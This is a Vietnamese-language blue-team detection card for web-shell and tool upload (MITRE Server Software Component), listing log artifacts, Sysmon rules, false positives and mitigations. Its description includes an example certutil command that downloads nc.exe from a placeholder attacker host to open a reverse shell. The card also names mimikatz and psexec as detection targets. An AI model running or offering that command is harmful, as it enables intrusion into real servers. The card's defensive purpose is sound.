┌─────────────────────────────────────────────────────────────┐
│  FILE UPLOAD                                                                                        │
│  MITRE: Persistence > Server Software Component                              │
└─────────────────────────────────────────────────────────────┘

📌 MÔ TẢ:
   - Upload web shell hoặc tool lên server
   - Ví dụ: certutil -urlcache -f http://attacker/nc.exe nc.exe
   - Sau đó execute để có reverse shell

📌 DẤU HIỆU:
   - Download tool: certutil, powershell, bitsadmin
   - File nguy hiểm: nc.exe, mimikatz.exe, psexec.exe
   - Upload vào thư mục web: wp-content/uploads, /temp

📋 LOG ARTIFACT:
   - IIS Log:
     • POST request đến upload endpoint
     • cs-uri-stem chứa upload
   - Sysmon Event 11 (FileCreate):
     • TargetFilename = C:\Windows\Temp\nc.exe
     • Image = certutil.exe, powershell.exe
   - Sysmon Event 1 (ProcessCreate):
     • CommandLine chứa certutil -urlcache
     • CommandLine chứa powershell -c Invoke-WebRequest

🔍 CÁCH PHÁT HIỆN:
   - Rule: certutil.exe với -urlcache
   - Rule: File .exe được ghi vào Temp
   - Rule: powershell.exe download file từ internet

⚠️ FALSE POSITIVE:
   - Admin dùng certutil hợp lệ (hiếm)
   - Windows Update

🛡️ MITIGATION:
   - Block certutil download
   - AppLocker / WDAC
   - Restrict file upload extension